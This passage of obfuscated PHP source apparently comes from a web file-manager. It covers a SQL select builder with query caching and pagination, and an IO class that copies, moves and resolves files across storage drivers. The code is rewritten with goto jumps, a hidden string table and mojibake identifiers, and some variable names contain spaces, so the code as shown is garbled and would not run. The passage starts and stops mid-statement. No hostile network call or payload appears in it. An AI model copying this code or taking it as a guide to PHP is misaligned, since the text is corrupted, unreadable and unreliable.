$D¬‰¹ù•Ú„[$B–êº·¨’Ñ[280]]; $fïÔø­ô˜Â = $this->buildSelectSql($D¬‰¹ù•Ú„); goto dÁÅôñÓ‘; FöÛÃ›…®: if ($B…—²…Øï¢ && !1 !== $FâŠÍ¬ÏÍ) { think_cache($fé¬¸½¾¬•, $FâŠÍ¬ÏÍ, $B…—²…Øï¢); } return $FâŠÍ¬ÏÍ; goto eë•¬­§ˆ; dÁÅôñÓ‘: $B…—²…Øï¢ = isset($D¬‰¹ù•Ú„[$B–êº·¨’Ñ[348]]) ? $D¬‰¹ù•Ú„[$B–êº·¨’Ñ[348]] : !1; if ($B…—²…Øï¢) { $fé¬¸½¾¬• = is_string($B…—²…Øï¢[$B–êº·¨’Ñ[96]]) ? $B…—²…Øï¢[$B–êº·¨’Ñ[96]] : $B–êº·¨’Ñ[723] . md5($fïÔø­ô˜Â); $Cª¢›îÑßÈ = think_cache($fé¬¸½¾¬•, $B–êº·¨’Ñ[33], $B…—²…Øï¢); if (!1 !== $Cª¢›îÑßÈ) { return $Cª¢›îÑßÈ; } } $FâŠÍ¬ÏÍ = $this->query($fïÔø­ô˜Â, $this->parseBind(!empty($D¬‰¹ù•Ú„[$B–êº·¨’Ñ[284]]) ? $D¬‰¹ù•Ú„[$B–êº·¨’Ñ[284]] : array())); goto FöÛÃ›…®; eë•¬­§ˆ: } public function buildSelectSql($b×®ŠÍŠŒ = array()) { goto eèëŸ®É¾š; fæš˜œÓªŠ: $F©ù»¡Ñ = $this->parseSql($this->selectSql, $b×®ŠÍŠŒ); $F©ù»¡Ñ .= $this->parseLock(isset($b×®ŠÍŠŒ[$aˆö©±¯„[545]]) ? $b×®ŠÍŠŒ[$aˆö©±¯„[545]] : !1); if (isset($Eµø‘˜‘›‘)) { think_cache($Eµø‘˜‘›‘, $F©ù»¡Ñ); } goto bÑŠÛ¸‹; eèëŸ®É¾š: $aˆö©±¯„ =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($b×®ŠÍŠŒ[$aˆö©±¯„[350]])) { if (strpos($b×®ŠÍŠŒ[$aˆö©±¯„[350]], $aˆö©±¯„[47])) { list($DÆÙÛ¬çƒ, $c¨›Ë‘Ì) = explode($aˆö©±¯„[47], $b×®ŠÍŠŒ[$aˆö©±¯„[350]]); } else { $DÆÙÛ¬çƒ = $b×®ŠÍŠŒ[$aˆö©±¯„[350]]; } $DÆÙÛ¬çƒ = $DÆÙÛ¬çƒ ? $DÆÙÛ¬çƒ : 1; $c¨›Ë‘Ì = isset($c¨›Ë‘Ì) ? $c¨›Ë‘Ì : (is_numeric($b×®ŠÍŠŒ[$aˆö©±¯„[291]]) ? $b×®ŠÍŠŒ[$aˆö©±¯„[291]] : 20); $aáìÓÃª¼ = $c¨›Ë‘Ì * ((int) $DÆÙÛ¬çƒ - 1); $b×®ŠÍŠŒ[$aˆö©±¯„[291]] = $aáìÓÃª¼ . $aˆö©±¯„[47] . $c¨›Ë‘Ì; } if (think_config($aˆö©±¯„[724])) { $Eµø‘˜‘›‘ = $aˆö©±¯„[725] . md5(serialize($b×®ŠÍŠŒ)); $CÖñ—°‰§ = think_cache($Eµø‘˜‘›‘); if ($CÖñ—°‰§) { return $CÖñ—°‰§; } } goto fæš˜œÓªŠ; bÑŠÛ¸‹: return $F©ù»¡Ñ; goto D¯³Ã³é”è; D¯³Ã³é”è: } public function parseSql($f¾â‡ŠÖëï, $bŒ‰Š÷Ò£ô = array()) { $B—Î˜©ÃÏ½ =& $_SERVER[°Óó£ÌİóèÅ]; $f¾â‡ŠÖëï = str_replace(array($B—Î˜©ÃÏ½[726], $B—Î˜©ÃÏ½[727], $B—Î˜©ÃÏ½[728], $B—Î˜©ÃÏ½[729], $B—Î˜©ÃÏ½[730], $B—Î˜©ÃÏ½[731], $B—Î˜©ÃÏ½[732], $B—Î˜©ÃÏ½[733], $B—Î˜©ÃÏ½[734], $B—Î˜©ÃÏ½[735], $B—Î˜©ÃÏ½[736]), array($this->parseTable("{$bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[278]]}"), $this->parseDistinct(isset($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[737]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[737]] : !1), $this->parseField(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[272]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[272]] : $B—Î˜©ÃÏ½[181]), $this->parseJoin(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[281]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[281]] : $B—Î˜©ÃÏ½[33]), $this->parseWhere(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[274]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[274]] : $B—Î˜©ÃÏ½[33]), $this->parseGroup(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[738]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[738]] : $B—Î˜©ÃÏ½[33]), $this->parseHaving(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[739]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[739]] : $B—Î˜©ÃÏ½[33]), $this->parseOrder(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[360]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[360]] : $B—Î˜©ÃÏ½[33]), $this->parseLimit(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[291]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[291]] : $B—Î˜©ÃÏ½[33]), $this->parseUnion(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[346]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[346]] : $B—Î˜©ÃÏ½[33]), $this->parseComment(!empty($bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[351]]) ? $bŒ‰Š÷Ò£ô[$B—Î˜©ÃÏ½[351]] : $B—Î˜©ÃÏ½[33])), $f¾â‡ŠÖëï); return $f¾â‡ŠÖëï; } public function getLastSql($cÒÍ¤ğ–Ÿ¢ = '') { return $cÒÍ¤ğ–Ÿ¢ ? $this->modelSql[$cÒÍ¤ğ–Ÿ¢] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($d»‰ÈÀÌàà) { return addslashes($d»‰ÈÀÌàà); } public function setModel($Fµ‡“×ñÀ) { $this->model = $Fµ‡“×ñÀ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cèæçÉ™Ì…, $bôÔ‰éÔ­) { $c¬¨­àö£ = self::driverMake($bôÔ‰éÔ­[0]); if (method_exists($c¬¨­àö£, $cèæçÉ™Ì…)) { return @call_user_func_array(array($c¬¨­àö£, $cèæçÉ™Ì…), $bôÔ‰éÔ­); } if (method_exists($c¬¨­àö£, $_SERVER[°Óó£ÌİóèÅ][740])) { return @call_user_func_array(array($c¬¨­àö£, $cèæçÉ™Ì…), $bôÔ‰éÔ­); } else { if (method_exists(self, $cèæçÉ™Ì…)) { return @call_user_func_array(array(self, $cèæçÉ™Ì…), $bôÔ‰éÔ­); } else { call_user_func_array(array(parent, $cèæçÉ™Ì…), $bôÔ‰éÔ­); } } } public static function init($a¿ß°ÇïÜ) { return self::driverMake($a¿ß°ÇïÜ); } public static function copy($f¥÷¦Æç†¶, $e¬ÆˆÓáˆÇ, $eõˆ†ëíá = false) { return self::copyMove($f¥÷¦Æç†¶, $e¬ÆˆÓáˆÇ, $eõˆ†ëíá, $_SERVER[°Óó£ÌİóèÅ][741]); } public static function move($Cê¢æ´—‹, $Eã¡¤¸”’ , $Eæ‹“ Æ = false) { return self::copyMove($Cê¢æ´—‹, $Eã¡¤¸”’ , $Eæ‹“ Æ, $_SERVER[°Óó£ÌİóèÅ][742]); } public static function saveFile($DÕªö„¬•, $cÛÉàãµ®¡, $b–ÁÉÍèè = true) { goto dÑÂÔÌ„; e´‹‰Ã‰: $E‡ŒİæÙŠŞ = self::copyFile($Dß ²¶§×, $DÕªö„¬•, $BôáâÈ‘Æ©, $dÃ‚ƒéæµÜ, $eì×¯ë½«[$A²æÚç· Ò[28]], $A¤¢ø²èå); if ($eÕäõ•‹ÃÌ) { $E‡ŒİæÙŠŞ = $eÕäõ•‹ÃÌ->getPathOuter($E‡ŒİæÙŠŞ); } return $E‡ŒİæÙŠŞ; goto E„ˆ×Óñ¼±; a¢ªñ»‡à: $BôáâÈ‘Æ© = self::driverMake($cÛÉàãµ®¡); $eÕäõ•‹ÃÌ = !1; if ($BôáâÈ‘Æ©->pathParse[$A²æÚç· Ò[743]]) { $c„ôª„Šø = $BôáâÈ‘Æ©->pathParse[$A²æÚç· Ò[743]]; $eÕäõ•‹ÃÌ = $BôáâÈ‘Æ©; $BôáâÈ‘Æ© = self::driverMake($c„ôª„Šø); } goto C²‹¶ğÈÎ; dÑÂÔÌ„: $A²æÚç· Ò =& $_SERVER[°Óó£ÌİóèÅ]; $eì×¯ë½« = self::info($cÛÉàãµ®¡); $Dß ²¶§× = self::driverMake($DÕªö„¬•); goto a¢ªñ»‡à; C²‹¶ğÈÎ: $dÃ‚ƒéæµÜ = $BôáâÈ‘Æ©->pathFather($cÛÉàãµ®¡); $A¤¢ø²èå = !0; if (!$b–ÁÉÍèè && self::driverIsSame($Dß ²¶§×, $BôáâÈ‘Æ©)) { $A¤¢ø²èå = !1; } goto e´‹‰Ã‰; E„ˆ×Óñ¼±: } private static function copyMove($E˜õî¯Œ•¦, $C‡•³Ÿê®, $CíãìÛ‡ê•, $c†›Ñ¥»ÌŞ) { goto eƒî¨¨Ä×Á; eƒî¨¨Ä×Á: $eŒ¹ƒ¸ë¹ =& $_SERVER[°Óó£ÌİóèÅ]; ignore_timeout(); $e„äÍ ¤Øâ = self::driverMake($E˜õî¯Œ•¦); goto bíâç‰¥à°; FøŞİŞ…³„: return $fï‰ÑÍğˆ¹; goto C‰­£Òİ‰; e¯ËĞŞŸÛÖ: if (!$eİ¶¦Ÿ‡ç’ && $fçª Ñ‚Î§->getType() == $eŒ¹ƒ¸ë¹[459] && $e„äÍ ¤Øâ->getType() == $eŒ¹ƒ¸ë¹[110]) { $fï‰ÑÍğˆ¹ = $fçª Ñ‚Î§->copyFolderFromIO($e„äÍ ¤Øâ, $E˜õî¯Œ•¦, $C‡•³Ÿê®, $CíãìÛ‡ê•, $Cô»Ö­ÇŸ); } else { $fï‰ÑÍğˆ¹ = self::copyPath($e„äÍ ¤Øâ, $E˜õî¯Œ•¦, $fçª Ñ‚Î§, $C‡•³Ÿê®, $CíãìÛ‡ê•, $Cô»Ö­ÇŸ, $eİ¶¦Ÿ‡ç’); } if ($fï‰ÑÍğˆ¹ && $Cô»Ö­ÇŸ) { $e„äÍ ¤Øâ->remove($E˜õî¯Œ•¦); } if ($dŒ‚”á„·) { $fï‰ÑÍğˆ¹ = $dŒ‚”á„·->getPathOuter($fï‰ÑÍğˆ¹); } goto FøŞİŞ…³„; fĞç‹ÄÊ¡: $c®§æÕèÅñ = self::driverIsSame($e„äÍ ¤Øâ, $fçª Ñ‚Î§); if ($c®§æÕèÅñ) { if ($c†›Ñ¥»ÌŞ == $eŒ¹ƒ¸ë¹[742] && trim($C‡•³Ÿê®, $eŒ¹ƒ¸ë¹[8]) == trim($fçª Ñ‚Î§->pathFather($E˜õî¯Œ•¦), $eŒ¹ƒ¸ë¹[8])) { return $fçª Ñ‚Î§->getPathOuter($E˜õî¯Œ•¦); } if (method_exists($fçª Ñ‚Î§, $c†›Ñ¥»ÌŞ)) { return $fçª Ñ‚Î§->{$c†›Ñ¥»ÌŞ}($E˜õî¯Œ•¦, $C‡•³Ÿê®, $CíãìÛ‡ê•); } } $eİ¶¦Ÿ‡ç’ = $e„äÍ ¤Øâ->isFile($E˜õî¯Œ•¦); goto e¯ËĞŞŸÛÖ; bíâç‰¥à°: $fçª Ñ‚Î§ = self::driverMake($C‡•³Ÿê®); $Cô»Ö­ÇŸ = $c†›Ñ¥»ÌŞ == $eŒ¹ƒ¸ë¹[742]; $dŒ‚”á„· = !1; goto eĞĞ¬Õ³¨; eĞĞ¬Õ³¨: if ($fçª Ñ‚Î§->pathParse[$eŒ¹ƒ¸ë¹[743]]) { $C‡•³Ÿê® = $fçª Ñ‚Î§->pathParse[$eŒ¹ƒ¸ë¹[743]]; $dŒ‚”á„· = $fçª Ñ‚Î§; $fçª Ñ‚Î§ = self::driverMake($C‡•³Ÿê®); } self::check($e„äÍ ¤Øâ, $E˜õî¯Œ•¦, $fçª Ñ‚Î§, $C‡•³Ÿê®); Hook::trigger($eŒ¹ƒ¸ë¹[81], $e„äÍ ¤Øâ, $E˜õî¯Œ•¦, $fçª Ñ‚Î§, $C‡•³Ÿê®); goto fĞç‹ÄÊ¡; C‰­£Òİ‰: } private static function check($F“£°£îÙƒ, $f˜Ó™¬‡Øá, $bªÀ¨¡ÁÂ , &$d¬Á†ÃÑÅÃ) { $C‚¶ËÛ„Û™ =& $_SERVER[°Óó£ÌİóèÅ]; if (self::driverIsSame($F“£°£îÙƒ, $bªÀ¨¡ÁÂ ) && $F“£°£îÙƒ->isFolder($f˜Ó™¬‡Øá) && $F“£°£îÙƒ->isParentOf($f˜Ó™¬‡Øá, $d¬Á†ÃÑÅÃ)) { show_json(LNG($C‚¶ËÛ„Û™[744]), !1); } if (!$F“£°£îÙƒ->exist($f˜Ó™¬‡Øá)) { show_json(LNG($C‚¶ËÛ„Û™[109]), !1); } } private static function copyPath($d‚”Ü³İ¼, $cº«¹¸–Ïä, $a®±à½‹Š½, $D”îŠƒéÒº, $fŞ¼ìâàù, $fƒø‚‘„Î·, $bİ´Èø„¨à) { goto AÊ„ëº¬ó»; EÂÎˆ ×¢ì: $aï•°¡ê•Æ = $a®±à½‹Š½->mkdir($a®±à½‹Š½->getPath($aÍ”Ç¦«×Ö)); $D”îŠƒéÒº = $a®±à½‹Š½->getPathInner($aï•°¡ê•Æ); $eÅÓË’£œª = $d‚”Ü³İ¼->listPath($cº«¹¸–Ïä, !0); goto B“Ù¹â¨ªˆ; E˜ƒôáÏ×’: if ($bİ´Èø„¨à) { if (!$a®±à½‹Š½->exist($D”îŠƒéÒº)) { $eíà—›Ã»ç = $a®±à½‹Š½->getPathName($a®±à½‹Š½->pathThis($D”îŠƒéÒº)); $D”îŠƒéÒº = $a®±à½‹Š½->pathFather($D”îŠƒéÒº); } return self::copyFile($d‚”Ü³İ¼, $cº«¹¸–Ïä, $a®±à½‹Š½, $D”îŠƒéÒº, $eíà—›Ã»ç, $fƒø‚‘„Î·); } if ($fŞ¼ìâàù == REPEAT_RENAME_FOLDER) { $fŞ¼ìâàù = !1; } $aÍ”Ç¦«×Ö = rtrim($D”îŠƒéÒº, $f™ÌÒ¢ô±³[8]) . $f™ÌÒ¢ô±³[8] . $eíà—›Ã»ç; goto EÂÎˆ ×¢ì; B“Ù¹â¨ªˆ: $eŞŒĞ‚´§Ì = array_merge($eÅÓË’£œª[$f™ÌÒ¢ô±³[82]], $eÅÓË’£œª[$f™ÌÒ¢ô±³[83]]); foreach ($eŞŒĞ‚´§Ì as $c•ğßÒ·µ) { $Cœ‚‘¸á = $c•ğßÒ·µ[$f™ÌÒ¢ô±³[29]] == $f™ÌÒ¢ô±³[172]; $cº«¹¸–Ïä = $d‚”Ü³İ¼->getPathInner($c•ğßÒ·µ[$f™ÌÒ¢ô±³[84]]); $EùÎ ƒ­Ë = self::copyPath($d‚”Ü³İ¼, $cº«¹¸–Ïä, $a®±à½‹Š½, $D”îŠƒéÒº, $fŞ¼ìâàù, $fƒø‚‘„Î·, $Cœ‚‘¸á); if (!$EùÎ ƒ­Ë) { write_log($f™ÌÒ¢ô±³[745] . $cº«¹¸–Ïä . $f™ÌÒ¢ô±³[746] . $D”îŠƒéÒº, $f™ÌÒ¢ô±³[747]); } } return $aï•°¡ê•Æ; goto aæî„ºñÏî; AÊ„ëº¬ó»: $f™ÌÒ¢ô±³ =& $_SERVER[°Óó£ÌİóèÅ]; $eíà—›Ã»ç = $d‚”Ü³İ¼->getPathName($d‚”Ü³İ¼->pathThis($cº«¹¸–Ïä)); if ($fŞ¼ìâàù) { $F˜ÈòâÕğ = $a®±à½‹Š½->fileNameExist($D”îŠƒéÒº, $eíà—›Ã»ç); $eíà—›Ã»ç = $a®±à½‹Š½->fileNameAuto($D”îŠƒéÒº, $eíà—›Ã»ç, $fŞ¼ìâàù, !$bİ´Èø„¨à); $fŞ¼ìâàù = $F˜ÈòâÕğ ? $fŞ¼ìâàù : !1; } goto E˜ƒôáÏ×’; aæî„ºñÏî: } private static function copyFile($C Éê¹àÅÑ, $eÕÄ÷†ğ¿×, $fôÜÏ×¥, $E¨á†Ô™›‘, $B©¼ˆß¶Å³, $bó¶»ã¶É’) { goto E•¹¿ÆÄùÓ; A›ÚÌåƒÆŸ: mk_dir($FÈœĞã×…«); $e…º²¬Ê‡ = $FÈœĞã×…« . $DÂ‚ØÍöˆÖ; $e…º²¬Ê‡ = $C Éê¹àÅÑ->download($eÕÄ÷†ğ¿×, $e…º²¬Ê‡); goto dªŞ Ò°ƒí; dªŞ Ò°ƒí: $e…º²¬Ê‡ = $C Éê¹àÅÑ->iconvApp($e…º²¬Ê‡); $C¬Âå›¢·½ = $fôÜÏ×¥->upload($E¨á†Ô™›‘, $e…º²¬Ê‡, $bó¶»ã¶É’); del_file($FÈœĞã×…« . $DÂ‚ØÍöˆÖ); goto BªëÚ´Œ‡½; DšÂ¢Ë–ë‡: Hook::trigger($D¨Ì±¤Ãà[749], $C Éê¹àÅÑ, $eÕÄ÷†ğ¿×, $fôÜÏ×¥, $E¨á†Ô™›‘, $B©¼ˆß¶Å³, $DÂ‚ØÍöˆÖ); if (self::driverIsSame($C Éê¹àÅÑ, $fôÜÏ×¥)) { if ($bó¶»ã¶É’) { $C¬Âå›¢·½ = $fôÜÏ×¥->moveFile($eÕÄ÷†ğ¿×, $E¨á†Ô™›‘); } else { $C¬Âå›¢·½ = $fôÜÏ×¥->copyFile($eÕÄ÷†ğ¿×, $E¨á†Ô™›‘); } Hook::trigger($D¨Ì±¤Ãà[750], $C Éê¹àÅÑ, $eÕÄ÷†ğ¿×, $fôÜÏ×¥, $E¨á†Ô™›‘, $B©¼ˆß¶Å³, $C¬Âå›¢·½); return $C¬Âå›¢·½; } $FÈœĞã×…« = TEMP_FILES; goto A›ÚÌåƒÆŸ; E•¹¿ÆÄùÓ: $D¨Ì±¤Ãà =& $_SERVER[°Óó£ÌİóèÅ]; $E¨á†Ô™›‘ = $fôÜÏ×¥->getPath(rtrim($E¨á†Ô™›‘, $D¨Ì±¤Ãà[8]) . $D¨Ì±¤Ãà[8] . $B©¼ˆß¶Å³); $DÂ‚ØÍöˆÖ = $D¨Ì±¤Ãà[748] . time() . rand_string(5); goto DšÂ¢Ë–ë‡; BªëÚ´Œ‡½: Hook::trigger($D¨Ì±¤Ãà[750], $C Éê¹àÅÑ, $eÕÄ÷†ğ¿×, $fôÜÏ×¥, $E¨á†Ô™›‘, $B©¼ˆß¶Å³, $C¬Âå›¢·½); return $C¬Âå›¢·½; goto DŠ§Í…ğ¿È; DŠ§Í…ğ¿È: } public static function fileOut($b÷íÔ»õß¬, $dî¹¶ÉĞ†ö = false, $a¿ˆ“Ãî¸Ö = false, $Dš”¼óÜ‹Š = '') { $DĞƒª‘¶™ =& $_SERVER[°Óó£ÌİóèÅ]; $DÍ‘ÈÚ‹ = self::driverMake($b÷íÔ»õß¬); $c‹Ü¤ˆ‹† = $GLOBALS[$DĞƒª‘¶™[6]][$DĞƒª‘¶™[92]][$DĞƒª‘¶™[751]]; if ($c‹Ü¤ˆ‹†) { return $DÍ‘ÈÚ‹->fileOutServer($b÷íÔ»õß¬, $dî¹¶ÉĞ†ö, $a¿ˆ“Ãî¸Ö, $Dš”¼óÜ‹Š); } return $DÍ‘ÈÚ‹->fileOut($b÷íÔ»õß¬, $dî¹¶ÉĞ†ö, $a¿ˆ“Ãî¸Ö, $Dš”¼óÜ‹Š); } public function fileOutImage($Bß„Êñ¼­Ø, $e”Ì˜ŠÜéÎ = 250) { $cª á´£¦­ =& $_SERVER[°Óó£ÌİóèÅ]; $cŠ³‹˜ÜŞÍ = self::driverMake($Bß„Êñ¼­Ø); $e»´ˆ‹“Œ = $GLOBALS[$cª á´£¦­[6]][$cª á´£¦­[92]][$cª á´£¦­[751]]; if ($e»´ˆ‹“Œ) { return $cŠ³‹˜ÜŞÍ->fileOutImageServer($Bß„Êñ¼­Ø, $e”Ì˜ŠÜéÎ); } return $cŠ³‹˜ÜŞÍ->fileOutImage($Bß„Êñ¼­Ø, $e”Ì˜ŠÜéÎ); } private static function driverIsSame($EöÍ¶ààèÂ, $b»™å–—¶×) { goto dÆÉÓƒ›; cáº‡æŠæ˜: if ($CÔĞÏÑİ != $CÁŸĞÁæ°ã) { return !1; } if ($CÔĞÏÑİ == $d“‹ªÙÁÖ‚[459]) { return !0; } if ($CÔĞÏÑİ == $d“‹ªÙÁÖ‚[110]) { return !0; } goto C»Ù÷…Æ¦; dÆÉÓƒ›: $d“‹ªÙÁÖ‚ =& $_SERVER[°Óó£ÌİóèÅ]; $CÔĞÏÑİ = $EöÍ¶ààèÂ->getType(); $CÁŸĞÁæ°ã = $b»™å–—¶×->getType(); goto cáº‡æŠæ˜; C»Ù÷…Æ¦: if ($EöÍ¶ààèÂ->pathDriver == $b»™å–—¶×->pathDriver) { return !0; } return !1; goto dè³Ó£õˆ; dè³Ó£õˆ: } public static function copyUpdate($dÁ‘î½Öâ, $BÅ³Ëô¡å) { goto fÆŒö´Àïİ; Aâ„ÑÕ´Æ´: $b Î¦Ø¨„ = self::_listAll($dÁ‘î½Öâ); $d„˜‹¹’ÅÎ = self::_listAll($BÅ³Ëô¡å); $c‡ŒŞã”’‹ = array(); goto fÅõ¤Û—êí; fÅõ¤Û—êí: $Aª›”Ÿ±½â = array(); foreach ($b Î¦Ø¨„ as $Bô†êöô”  => $c¾ïà×ëæ) { if ($c¾ïà×ëæ[$dŠùºÑÙæ[85]] == 1 && !isset($d„˜‹¹’ÅÎ[$Bô†êöô” ])) { $Aª›”Ÿ±½â[] = $BÅ³Ëô¡å . $dŠùºÑÙæ[8] . $Bô†êöô” ; } if ($c¾ïà×ëæ[$dŠùºÑÙæ[85]] == 0) { if (!isset($d„˜‹¹’ÅÎ[$Bô†êöô” ]) || $d„˜‹¹’ÅÎ[$Bô†êöô” ][$dŠùºÑÙæ[86]] != $c¾ïà×ëæ[$dŠùºÑÙæ[86]]) { $c‡ŒŞã”’‹[] = array($dŠùºÑÙæ[752] => $c¾ïà×ëæ[$dŠùºÑÙæ[84]], $dŠùºÑÙæ[753] => $BÅ³Ëô¡å . $dŠùºÑÙæ[8] . get_path_father($Bô†êöô” ), $dŠùºÑÙæ[754] => $c¾ïà×ëæ); if (isset($d„˜‹¹’ÅÎ[$Bô†êöô” ])) { IO::remove($BÅ³Ëô¡å . $dŠùºÑÙæ[8] . $Bô†êöô” ); } } } } $eÍÇ¦“Ë‘ = array($dŠùºÑÙæ[172] => $c‡ŒŞã”’‹, $dŠùºÑÙæ[85] => $Aª›”Ÿ±½â); goto CÆ±‚×Ú¬Ô; fÆŒö´Àïİ: $dŠùºÑÙæ =& $_SERVER[°Óó£ÌİóèÅ]; if (!IO::exist($dÁ‘î½Öâ)) { return !1; } if (!IO::exist($BÅ³Ëô¡å)) { IO::mkdir($BÅ³Ëô¡å); } goto Aâ„ÑÕ´Æ´; CÆ±‚×Ú¬Ô: Hook::trigger($dŠùºÑÙæ[755], $dÁ‘î½Öâ, $BÅ³Ëô¡å, $eÍÇ¦“Ë‘); foreach ($Aª›”Ÿ±½â as $c¾ïà×ëæ) { IO::mkdir($c¾ïà×ëæ); } foreach ($c‡ŒŞã”’‹ as $c¾ïà×ëæ) { IO::copy($c¾ïà×ëæ[$dŠùºÑÙæ[752]], $c¾ïà×ëæ[$dŠùºÑÙæ[753]], REPEAT_REPLACE); } goto C¨ØéâïÆ±; C¨ØéâïÆ±: } private static function _listAll($c‡ÙÊíœÄ„) { $eçåÓƒŞš =& $_SERVER[°Óó£ÌİóèÅ]; $c‡ÙÊíœÄ„ = KodIO::clear($c‡ÙÊíœÄ„); $aù‰ƒ’Ü = IO::listAll($c‡ÙÊíœÄ„); foreach ($aù‰ƒ’Ü as &$Fïö±ÔÁ¦Ï) { $dœ¸„ŸØ™ = substr($Fïö±ÔÁ¦Ï[$eçåÓƒŞš[84]], strlen($c‡ÙÊíœÄ„)); $Fïö±ÔÁ¦Ï[$eçåÓƒŞš[756]] = trim($dœ¸„ŸØ™, $eçåÓƒŞš[8]); } return array_to_keyvalue($aù‰ƒ’Ü, $eçåÓƒŞš[756]); } private static function driverMake(&$bŒ×ôÚö–†) { goto f¸Ì²•‘‡; f«Èô±È³ï: return $A³©À¾Æ¶; goto eÇßŞ»àÔÚ; f¸Ì²•‘‡: $Fæ´¥ãˆŸª =& $_SERVER[°Óó£ÌİóèÅ]; $d¬“ÓœÜ£” = KodIO::parse($bŒ×ôÚö–†); if (!self::$driverListSystem) { $EÑ…½¥§íí = Model($Fæ´¥ãˆŸª[469])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($EÑ…½¥§íí, $Fæ´¥ãˆŸª[376]); } goto bäƒ¥‡ÏÔ†; bäƒ¥‡ÏÔ†: if ($d¬“ÓœÜ£”[$Fæ´¥ãˆŸª[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d¬“ÓœÜ£”[$Fæ´¥ãˆŸª[376]]]) { return !1; } $bŒ×ôÚö–† = $d¬“ÓœÜ£”[$Fæ´¥ãˆŸª[757]]; $A³©À¾Æ¶ = self::driverGet($d¬“ÓœÜ£”, $bŒ×ôÚö–†); goto f«Èô±È³ï; eÇßŞ»àÔÚ: } private static function driverGet($F§½¥¦ˆí‡, &$bš®éõ‘«ƒ) { goto b¤ì—ØøÍ—; b¤ì—ØøÍ—: $DÙ±–£ÚÒ =& $_SERVER[°Óó£ÌİóèÅ]; $dÖÔ¸±Ó† = $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[758]]; $d“è¶ºœÔ¦ = $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[376]]; goto Eù¸é‚£ê¶; Eù¸é‚£ê¶: switch ($F§½¥¦ˆí‡[$DÙ±–£ÚÒ[29]]) { case KodIO::KOD_IO: $Eƒ•ïÊË² = self::$driverListSystem[$d“è¶ºœÔ¦]; break; case KodIO::KOD_SOURCE: $bš®éõ‘«ƒ = $d“è¶ºœÔ¦ . $bš®éõ‘«ƒ; $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[760], $DÙ±–£ÚÒ[6] => $F§½¥¦ˆí‡); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $eÊëŒÄ™¹  = $GLOBALS[$DÙ±–£ÚÒ[761]]; self::$driverListUser = array_to_keyvalue($eÊëŒÄ™¹ , $DÙ±–£ÚÒ[376]); } $Eƒ•ïÊË² = self::$driverListUser[$d“è¶ºœÔ¦]; break; case KodIO::KOD_SHARE_LINK: $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[762], $DÙ±–£ÚÒ[6] => $F§½¥¦ˆí‡); $EùóŞƒõ = Action($DÙ±–£ÚÒ[763])->sharePathInfo($F§½¥¦ˆí‡[$DÙ±–£ÚÒ[84]]); $bš®éõ‘«ƒ = $EùóŞƒõ[$DÙ±–£ÚÒ[382]]; if (!$EùóŞƒõ[$DÙ±–£ÚÒ[382]]) { $bñ‹Õç‡Ÿà = Model($DÙ±–£ÚÒ[426])->getInfo($EùóŞƒõ[$DÙ±–£ÚÒ[427]]); $bš®éõ‘«ƒ = KodIO::clear($bñ‹Õç‡Ÿà[$DÙ±–£ÚÒ[764]] . $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[757]]); $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[765]] = $bñ‹Õç‡Ÿà; $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[743]] = $bš®éõ‘«ƒ; $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[766], $DÙ±–£ÚÒ[6] => $F§½¥¦ˆí‡); } break; case KodIO::KOD_SHARE_ITEM: $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[767], $DÙ±–£ÚÒ[6] => $F§½¥¦ˆí‡); $bñ‹Õç‡Ÿà = Model($DÙ±–£ÚÒ[426])->getInfo($F§½¥¦ˆí‡[$DÙ±–£ÚÒ[376]]); if ($bñ‹Õç‡Ÿà[$DÙ±–£ÚÒ[382]] == $DÙ±–£ÚÒ[410]) { $bš®éõ‘«ƒ = KodIO::clear($bñ‹Õç‡Ÿà[$DÙ±–£ÚÒ[764]] . $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[757]]); $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[765]] = $bñ‹Õç‡Ÿà; $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[743]] = $bš®éõ‘«ƒ; $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[768], $DÙ±–£ÚÒ[6] => $F§½¥¦ˆí‡); } break; default: $bš®éõ‘«ƒ 